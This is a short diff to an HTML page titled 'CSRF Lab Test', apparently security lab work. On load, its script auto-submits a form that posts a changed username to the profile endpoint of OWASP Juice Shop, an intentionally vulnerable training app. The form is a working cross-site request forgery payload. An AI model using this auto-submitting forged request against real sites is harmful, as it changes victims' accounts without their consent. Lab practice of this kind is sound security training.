@@ -4,16 +4,14 @@
 <body>
   <h2>CSRF Lab Test</h2>
 
-  <form action="http://localhost:3000/profile"
-        method="post">
-    <input type="hidden" name="username" value="CSRF-test-2" />
-  </form>
+ <form action="https://preview.owasp-juice.shop/profile" method="POST">
+  <input type="text" name="username" value="CSRF_soha" />
+  <input type="submit" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
 
-  <script>
-    window.onload = function() {
-      document.forms[0].submit();
-    };
-  </script>
 
 </body>
 </html>
